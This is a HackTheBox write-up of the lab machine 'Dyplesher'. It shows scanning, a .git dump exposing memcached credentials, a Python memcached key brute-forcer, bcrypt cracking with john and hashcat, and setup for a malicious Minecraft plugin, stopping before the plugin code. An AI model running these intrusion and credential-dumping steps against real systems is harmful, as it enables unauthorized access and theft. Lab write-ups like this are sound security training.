---
title: "HackTheBox — Dyplesher Writeup"
date: 2020-10-30 13:00:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, dyplesher, ctf, .git, vhost, gogs, memcached, binaryprotocol, memcached-cli, bmemcached, python-script, bruteforce, keys, gitbundle, sqlite, hashcat, bukkit, itellij, java, minecraft, plugin, wireshark, dumpcap, packet-capture, sniffing, cuberite, amqp, rabbitmq, amqp-publish, ssh, public-key, lua, root ]
image: /assets/img/Posts/Dyplesher.png
---

> Dyplesher was one of the toughest machine I've ever encountered with lots of new things to learn. Initial enumeration leads us to a virtual host with a .git directory exposing credentials for memcached. After understanding memcached is using binary protocol for authentication, rather than guessing key names to dump data I wrote my own memcache key brute forcing script, using this script we are able to dump username and password from the cache. One of these credentials allows us to access Gogs, Inside Gogs we discover a GitLab backup containing four git bundles, one of these bundles contains Minecraft plugin data along with a SQLite database file containing a password hash, Cracked password authorizes login to Dyplesher Dashboard. Using this dashboard we can upload and run Minecraft plugins, We'll then write a malicious plugin that Injects a SSH key and also writes a PHP backdoor webshell on the server, Leveraging SSH key we'll access the box where we discover the user is part of Wireshark group having access to dumpcap binary, utilizing it we'll capture raw traffic over loopback interface discovering AMQP packets containing username and passwords of multiple users. One of these users has a note to send plugin download URL over RabbitMQ queue which gets the server to download and execute a Cuberite Plugin. We'll create a malicious Lua Script (Cuberite Plugin) which on execution drops a SSH key to root allowing us to elevate privileges to root.

## Reconnaissance

Let's begin with `masscan` to identify open TCP and UDP ports

#### masscan

```shell
cfx:  ~/Documents/htb/dyplesher
→ masscan -e tun0 -p1-65535,U:1-65535 --rate 500 10.10.10.190 | tee masscan.ports

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-10-26 14:42:49 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 4369/tcp on 10.10.10.190
Discovered open port 80/tcp on 10.10.10.190
Discovered open port 5672/tcp on 10.10.10.190
Discovered open port 25565/tcp on 10.10.10.190
Discovered open port 22/tcp on 10.10.10.190
Discovered open port 25562/tcp on 10.10.10.190
Discovered open port 3000/tcp on 10.10.10.190
Discovered open port 11211/tcp on 10.10.10.190
Discovered open port 25672/tcp on 10.10.10.190
```
Looking at the output, we have multiple tcp ports. Let's format the result using `sed` and `awk` and run nmap scan against them :

#### nmap

```shell
cfx:  ~/Documents/htb/dyplesher
→ cat masscan.ports | grep tcp | sed 's/Discovered open port //' | awk -F/ '{print $1}' ORS=','
4369,80,5672,25565,22,25562,3000,11211,25672,

cfx:  ~/Documents/htb/dyplesher
→ nmap -sC -sV -p4369,80,5672,25565,22,25562,3000,11211,25672 10.10.10.190
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-26 20:26 IST
Nmap scan report for 10.10.10.190
Host is up (0.28s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
80/tcp    open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyplesher
3000/tcp  open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=77fec466a7c67b0f; Path=/; HttpOnly
|     Set-Cookie: _csrf=YQrOkUVXiimw_Dv_s-wdCSuF39g6MTYwMzcyNDI4Nzk2Njg4NzY4NQ%3D%3D; Path=/; Expires=Tue, 27 Oct 2020 14:58:07 GMT; HttpOnly
|     Date: Mon, 26 Oct 2020 14:58:07 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="YQrOkUVXiimw_Dv_s-wdCSuF39g6MTYwMzcyNDI4Nzk2Njg4NzY4NQ==" />
|     <meta name="_suburl" content="" />
|     <meta proper
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=63c111443d847cf8; Path=/; HttpOnly
|     Set-Cookie: _csrf=muDQJ-CeJEEDNg2aYflF4EilJd06MTYwMzcyNDI5NDQwMjE5Njc0Mw%3D%3D; Path=/; Expires=Tue, 27 Oct 2020 14:58:14 GMT; HttpOnly
|     Date: Mon, 26 Oct 2020 14:58:14 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="muDQJ-CeJEEDNg2aYflF4EilJd06MTYwMzcyNDI5NDQwMjE5Njc0Mw==" />
|     <meta name="_suburl" content="" />
|_    <meta
4369/tcp  open  epmd       Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
5672/tcp  open  amqp       RabbitMQ 3.7.8 (0-9)
| amqp-info:
|   capabilities:
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@dyplesher
|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
|   platform: Erlang/OTP 22.0.7
|   product: RabbitMQ
|   version: 3.7.8
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
11211/tcp open  memcache?
25562/tcp open  unknown
25565/tcp open  minecraft?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:
|     '{"text":"Unsupported protocol version"}
|   NotesRPC:
|     q{"text":"Unsupported protocol version 0, please use one of these versions:
|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x"}
25672/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.91%I=7%D=10/26%Time=5F96E3AF%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2063,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=77fec466a7c67b0f;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=YQrOkUVXiimw_Dv_s-wdCSu
SF:F39g6MTYwMzcyNDI4Nzk2Njg4NzY4NQ%3D%3D;\x20Path=/;\x20Expires=Tue,\x2027
SF:\x20Oct\x202020\x2014:58:07\x20GMT;\x20HttpOnly\r\nDate:\x20Mon,\x2026\
[..SNIP..]
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port25565-TCP:V=7.91%I=7%D=10/26%Time=5F96E3D4%P=x86_64-pc-linux-gnu%r(
SF:DNSVersionBindReqTCP,2A,"\)\0'{\"text\":\"Unsupported\x20protocol\x20ve
SF:rsion\"}")%r(DNSStatusRequestTCP,2A,"\)\0'{\"text\":\"Unsupported\x20pr
SF:otocol\x20version\"}")%r(SSLSessionReq,2A,"\)\0'{\"text\":\"Unsupported
SF:\x20protocol\x20version\"}")%r(TLSSessionReq,2A,"\)\0'{\"text\":\"Unsup
SF:ported\x20protocol\x20version\"}")%r(LPDString,2A,"\)\0'{\"text\":\"Uns
[..SNIP..]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.77 seconds
```
#### Summary:

1. Port 22 - SSH
2. Port 80, 3000 - HTTP Service, some website on Port 80 & Gogs on Port 3000
3. Port 4369 - Erlang Port Mapper Daemon, referencing RabbitMQ node on Port 25672
4. Port 5672 - AMQP RabbitMQ
5. Port 11211 -  Memcache Service
6. Port 25562 - Unknown Service
7. Port 25565 - Minecraft

### Port 80 - HTTP Service

#### Dyplesher.htb - Site

Visiting <http://10.10.10.190>, front page of the site says **Worst Minecraft Server**

![website](/assets/img/Posts/Dyplesher/website.png)

Interestingly, we see reference of VHost `test.dyplesher.htb` on the front page, so we'll that and `dyplesher.htb` to `/etc/hosts` file and move forward with our enumeration.

Almost all links seem to be dead except, a youtube link **How to get headshot** (fun video) & `STAFF` link which leads us to this page :

![staff](/assets/img/Posts/Dyplesher/staff.png)

These three could be our potential usernames, Beneath each user, there is a Gogs icon which redirects to `http://dyplesher.htb:8080/<username>`, that's weird because we didn't see Port 8080 open in `masscan` output. Still I tried visiting the link, it kept loading for a while then failed.

#### Web Fuzzing - ffuf

Let's run `ffuf` against the site to discover hidden files and directories, in addition we'll include `.php` extension since the site returns without any error when trying `http://10.10.10.190/index.php`

```shell
cfx:  ~/Documents/htb/dyplesher
→ ffuf -c -r -u http://10.10.10.190/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 403 -e .php

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.190/FUZZ
 :: Extensions       : .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
home                    [Status: 200, Size: 4168, Words: 1222, Lines: 84]
index.php               [Status: 200, Size: 4241, Words: 1281, Lines: 124]
login                   [Status: 200, Size: 4168, Words: 1222, Lines: 84]
register                [Status: 200, Size: 4168, Words: 1222, Lines: 84]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3]
staff                   [Status: 200, Size: 4376, Words: 1534, Lines: 103]
:: Progress: [9304/9304] :: Job [1/1] :: 76 req/sec :: Duration: [0:02:02] :: Errors: 0 ::
```

#### Login & Register

Visiting <http://10.10.10.190/login> brings us to the login page, also visiting `/register` redirects us to the login page:

![login](/assets/img/Posts/Dyplesher/login.png)

### Port 3000 - Gogs

On Port 3000 is hosting a Gogs instance. Visiting `http://dyplesher.htb:3000` we see Gogs page:

![gogs](/assets/img/Posts/Dyplesher/gogs.png)

Under `Explore` page, we can just view the `Users` and nothing else, To look at their repositories we need to be authenticated. We can register an account, but it doesn't give us anything interesting.

![gogs1](/assets/img/Posts/Dyplesher/gogs1.png)

### VHost - test.dyplesher.htb

![vhost](/assets/img/Posts/Dyplesher/vhost.png)

Site returns a simple form which takes two inputs and compare them, if both key and value are same, the same page is returned.

#### Web Fuzzing - test.dyplesher.htb

```shell
cfx:  ~/Documents/htb/dyplesher
→ ffuf -c -r -u http://test.dyplesher.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://test.dyplesher.htb/FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]
:: Progress: [4652/4652] :: Job [1/1] :: 160 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
```

Woah ! A `.git` directory is getting exposed.

#### Git Dump

Let's use [**GitTools's**](https://github.com/internetwache/GitTools) `gitdumper.sh` to dump the contents of repository:

```shell
cfx:  ~/Documents/htb/dyplesher/gitrepo
→ /opt/GitTools/Dumper/gitdumper.sh http://test.dyplesher.htb/.git/ .
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating ./.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433
[+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
[+] Downloaded: objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0
```

Looking at the `git status`, we see two files have been deleted :

```shell
cfx:  ~/Documents/htb/dyplesher/gitrepo  |master U:2 ✗|
→ git status
On branch master
Your branch is based on 'origin/master', but the upstream is gone.
  (use "git branch --unset-upstream" to fixup)

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
        deleted:    README.md
        deleted:    index.php

no changes added to commit (use "git add" and/or "git commit -a")
```
Let's restore the files using `git restore`

```shell
cfx:  ~/Documents/htb/dyplesher/gitrepo  |master U:2 ✗|
→ git restore README.md index.php

cfx:  ~/Documents/htb/dyplesher/gitrepo  |master ✓|
→ ls
index.php  README.md
```

While `README.md` was empty, we find something interesting inside `index.php` :

```php
<HTML>
<BODY>
<h1>Add key and value to memcache<h1>
<FORM METHOD="GET" NAME="test" ACTION="">
<INPUT TYPE="text" NAME="add">
<INPUT TYPE="text" NAME="val">
<INPUT TYPE="submit" VALUE="Send">
</FORM>

<pre>
<?php
if($_GET['add'] != $_GET['val']){
        $m = new Memcached();
        $m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
        $m->setSaslAuthData("felamos", "zxcvbnm");
        $m->addServer('127.0.0.1', 11211);
        $m->add($_GET['add'], $_GET['val']);
        echo "Done!";
}
else {
        echo "its equal";
}
?>
</pre>

</BODY>
</HTML>
```

We discover credentials for user `felamos:zxcvbnm`, traditionally we don't see memcached requiring credentials for connection. But here it's using some kind of authentication protocol.

## Memcached Service

### Overview

Memcached supports two protocol, ASCII & Binary. It seems the ASCII protocol is slower than Binary Protocol, also in ASCII protocol based Memcached service we could dump all the keys, But here from the above code, we can see it's using `Binary Protocol`

> Most deployments of Memcached are within trusted networks where clients may freely connect to any server. However, sometimes Memcached is deployed in untrusted networks or where administrators want to exercise control over the clients that are connecting. For this purpose Memcached can be compiled with optional SASL authentication support. The SASL support requires the binary protocol.

Now that we have credentials to authenticate with Memcache, we can tools like `memcached-cli` and `memccat` to dump the values from key.

### Memcached-cli

Memcached-cli doesn't come preinstalled on Kali VM, being a node based tool we can install it using :

- apt-get install npm
- npm install -g memcached-cli

```shell
cfx:  ~/Documents/htb/dyplesher
→ memcached-cli felamos:zxcvbnm@10.10.10.190:11211
10.10.10.190:11211> get users
null

10.10.10.190:11211> get password
$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS
```

Connecting with creds, I tried `users` and `password` since these two were something which we saw working in Previous machines.

Out of the two password returned some values successfully, seems we got lucky as it was indeed a key. But guessing isn't a actual solution.

### Brute-force keys

Having the thought of brute forcing the key names, I decided to write a python script using `bmemcached` module, which will allow us to connect to the service.

I stumbled upon this [**Guide on bmemcached**](https://pypi.org/project/python-binary-memcached/) module which explains the installation and usage of this module:

Module installations:
- `pip3 install python-binary-memcached`
- `pip3 install pwn`

#### Python Script

```python
cfx:  ~/Documents/htb/dyplesher
→ cat memcachebrute.py
#!/usr/bin/python3

import bmemcached
import sys
from pwn import *

brutefile = sys.argv[1]
connect = bmemcached.Client('10.10.10.190:11211', 'felamos', 'zxcvbnm')
brutefile = open(brutefile).readlines()
for param in brutefile:
    param = param.strip()
    result = str(connect.get(param))
    if 'None' not in result:
        print()
        log.info(f"Key -> {param}")
        log.success(result)
```
This script takes one argument where we have to specify the wordlist to be used for brute force.

Executing the script we see three results:

```shell
cfx:  ~/Documents/htb/dyplesher
→ ./memcachebrute.py /usr/share/seclists/Discovery/Variables/secret-keywords.txt

[*] Key -> email
[+] MinatoTW@dyplesher.htb
    felamos@dyplesher.htb
    yuntao@dyplesher.htb

[*] Key -> password
[+] $2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
    $2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
    $2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

[*] Key -> username
[+] MinatoTW
    felamos
    yuntao
```

### Hash Cracking

Let's crack these hashes using john, One of it cracks as `mommy1`

```shell
cfx:  ~/Documents/htb/dyplesher
→ cat memcache.dump
MinatoTW:$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa
felamos:$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK
yuntao:$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS

cfx:  ~/Documents/htb/dyplesher
→ john memcache.dump -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mommy1           (felamos)
```
### Gogs Login

Since we were unsure whether the password works with `felamos` username, I tried the it against each user and fortunately it worked for user felamos

After successful login with `felamos:mommy1`, On dashboard we see felamos has created two repositories `memcached` and `gitlab`

![gogslogin](/assets/img/Posts/Dyplesher/gogslogin.png)

Going through the repo's we see `memcached` is the same we retrieved earlier. The `gitlab` repository just has a `README.md` stating it's a GitLab backup.

However In the release section we do find `repo.zip` which we'll download for further analysis.

![gogsrelease](/assets/img/Posts/Dyplesher/gogsrelease.png)

### Gitlab - repo.zip

Unzipping the repo, we see it contains four `.bundle` files which are actually Git Bundle :

```shell
cfx:  ~/Documents/htb/dyplesher/repositories
→ tree
.
|____@hashed
| |____6b
| | |____86
| | | |____6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
| |____d4
| | |____73
| | | |____d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
| |____4e
| | |____07
| | | |____4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
| | | |____4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
| |____4b
| | |____22
| | | |____4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
```
> The git bundle command packages objects and references in an archive at the originating machine, which can then be imported into another repository using git fetch, git pull, or git clone, after moving the archive by some means (e.g., by sneakernet).

Bottom-line, each bundle is an archive of a repository.

We'll unpack each bundle using `git clone` :

```shell
cfx:  ~/Documents/htb/dyplesher/repositories
→ git clone @hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle
Cloning into '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a'...
Receiving objects: 100% (39/39), 10.46 KiB | 10.46 MiB/s, done.
Resolving deltas: 100% (12/12), done.

cfx:  ~/Documents/htb/dyplesher/repositories
→ git clone @hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle
Cloning into '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce'...
Receiving objects: 100% (51/51), 20.94 MiB | 22.28 MiB/s, done.
Resolving deltas: 100% (5/5), done.

cfx:  ~/Documents/htb/dyplesher/repositories
→ git clone @hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle
Cloning into '6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b'...
Receiving objects: 100% (85/85), 30.69 KiB | 2.36 MiB/s, done.
Resolving deltas: 100% (40/40), done.

cfx:  ~/Documents/htb/dyplesher/repositories
→ git clone @hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle
Cloning into 'd4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35'...
Receiving objects: 100% (21/21), 16.98 KiB | 5.66 MiB/s, done.
Resolving deltas: 100% (9/9), done.
```
Going through each of these repos, it appears that only `4e07..fce.bundle` has something related to `felamos` and `Minecraft Plugins`

```shell
cfx:  ~/Documents/htb/dyplesher/repositories/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce  |master ✓|
→ git log
commit 16a1182b900906b761b69ee32b4be9bb98db5f08 (HEAD -> master, origin/master, origin/HEAD)
Author: felamos <felamos@pm.me>
Date:   Sun May 24 08:46:48 2020 +0530

cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce  |master ✓|
→ ls
banned-ips.json      bukkit.yml    craftbukkit-1.8.jar  help.yml  permissions.yml  python     sc-mqtt.jar        spigot-1.8.jar  usercache.json  world
banned-players.json  commands.yml  eula.txt             ops.json  plugins          README.md  server.properties  start.command   whitelist.json  world_the_end
```
#### sqlite3 - users.db

Further enumerating leas us to `users.db` file inside `/plugins/LoginSecurity`

```shell
cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce/plugins/LoginSecurity  |master ✓|
→ ls
authList  config.yml  users.db
```
The database file is SQLite:

```shell
cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce/plugins/LoginSecurity  |master ✓|
→ file users.db
users.db: SQLite 3.x database, last written using SQLite version 3027002
```
Discovering hash inside `users.db`:

```shell
cfx:  ~/Documents/htb/dyplesher/repositories/4e0740856[..SNIP..]49fce/plugins/LoginSecurity  |master ✓|
→ sqlite3 users.db
SQLite version 3.33.0 2020-08-14 13:23:32
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .tables
users
sqlite> select * from users;
unique_user_id|password|encryption|ip
18fb40a5c8d34f249bb8a689914fcac3|$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6|7|/192.168.43.81
```

### Hash Crack - users.db

#### Hashcat

Both `john` and `hashcat` are more than capable to crack it easily, but since we cracked the earlier discovered hash using john, let's crack this one using hashcat :

```shell
cfx:  ~/Documents/htb/dyplesher
→ cat db.hash
$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6
```
Using `hashid` to get its Hashcat mode and crack it using `hashcat` :

```shell
cfx:  ~/Documents/htb/dyplesher
→ hashid -m '$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6'
Analyzing '$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x
[+] bcrypt [Hashcat Mode: 3200]

cfx:  ~/Documents/htb/dyplesher
→ hashcat -m 3200 db.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

[..SNIP..]

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$10$IRgHi7pBhb9K0QBQBOzOju0PyOZhBnK4yaWjeZYdeP6oyDvCo9vc6:alexis1

Session..........: hashcat
Status...........: Cracked
[..SNIP..]
```
Cracked Password : `alexis1`

### Dyplesher - Dashboard

#### http://dyplesher.htb/login

Using `felamos@dyplesher.htb:alexis1` we can login to Dyplesher.

#### Dashboard & Players

While `Dashboard` displays player statistics & other details, `Players` leads us to `/home/players` displaying players details.

![dashboard](/assets/img/Posts/Dyplesher/dashboard.png)

#### Console

Located at `/home/console` it displays command outputs

![console](/assets/img/Posts/Dyplesher/console.png)

#### Reload Plugin

This option allows us to Load and Unload plugins, apart from that it also notifies us visiting `/home/reset` we can reset.

![reload](/assets/img/Posts/Dyplesher/reload.png)

#### Add Plugin

Using this option we can upload a plugin.

![add](/assets/img/Posts/Dyplesher/add.png)

#### Delete Plugin

This option doesn't actually deletes the plugin because the trash icon doesn't work, instead it helps to view current plugins.

![delete](/assets/img/Posts/Dyplesher/delete.png)

All these are probably hinting us that we have to do something with plugin, maybe upload a malicious crafted plugin which gets us remote code execution.

Also inside `4e07` we saw bukkit, craftbukkit & spigot files.

>Bukkit is a free, open-source, software that provides the means to extend the popular Minecraft multiplayer server.

> Bukkit is the API which Bukkit plugins use to interact with the server. CraftBukkit is a modified vanilla minecraft server with the Bukkit API built into it. Spigot is a modified craftbukkit server to improve performance, which also extends the Bukkit API a bit.

## Crafting Malicious Minecraft Plugin

### Environment Setup

Crafting & generating a Bukkit plugin was something new for me, so I hoped onto my Ubuntu VM where I would usually do all the development work as I don't appreciate messing up Kali VM while trying something new.


1. For installing Java use `apt install openjdk-8-jdk`
2. Then using Ubuntu's software centre I installed `Intellij IDEA Community Edition` for detailed reference for installation on other Distros please refer this [**Guide**](https://itsfoss.com/install-intellij-ubuntu-linux/)

During initial setup for Intellij I just ensured that Maven is being installed in build tools although it already comes as built-in tool, rest everything I kept as default.

### Creating New Project

We will refer this [**Guide to create blank Spigot plugin**](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/)

#### Step 1

First, We select New project, a new window pops-up where we select Maven and ensure selected Java version is 1.8 :

![pstep1](/assets/img/Posts/Dyplesher/pstep1.png)

#### Step 2

On the next windows, I'll name it as `cfx` and leave the rest as it is:

![pstep2](/assets/img/Posts/Dyplesher/pstep2.png)

#### Step 3

We get a new windows, where we have a file named `pom.xml`, with reference to the above [**guide**](https://www.spigotmc.org/wiki/creating-a-plugin-with-maven-using-intellij-idea/) we'll add all the dependencies and repositories, final `pom.xml` should look something this, then we click `m` icon on the right side which will load all Maven changes:

![pstep3](/assets/img/Posts/Dyplesher/pstep3.png)

Once we click on `m` icon, it should take some time for indexing plugin data, we should be able to see a small progress bar at bottom of the page.

#### Step 4

Next on the left side we should see project structure details, First we select src -> main -> java, right click java and select New -> Package and name it as `htb.dyplesher.cfx`

Once the package has been created, right click package and select New -> Java Class and name it as `fusion`

![pstep4](/assets/img/Posts/Dyplesher/pstep4.png)

#### Step 5

Finally we'll create a `plugin.yml` file, Right click resource tab, New -> File, and naming it as `plugin.yml`. Here we'll specify Name of the plugin, it's version, and path to the Main class.

```shell
name: coldfx
version: 1.0
main: htb.dyplesher.cfx.fusion
```
- Plugin name is `coldfx`, Path to main class is `htb.dyplesher.cfx.fusion` where htb.dyplesher.cfx is the package name and fusion is the main class name.

### Generating a test Plugin

Great ! So now that we all the required files for generating a plugin, let's input our java code inside `fusion.java` file and generate a package

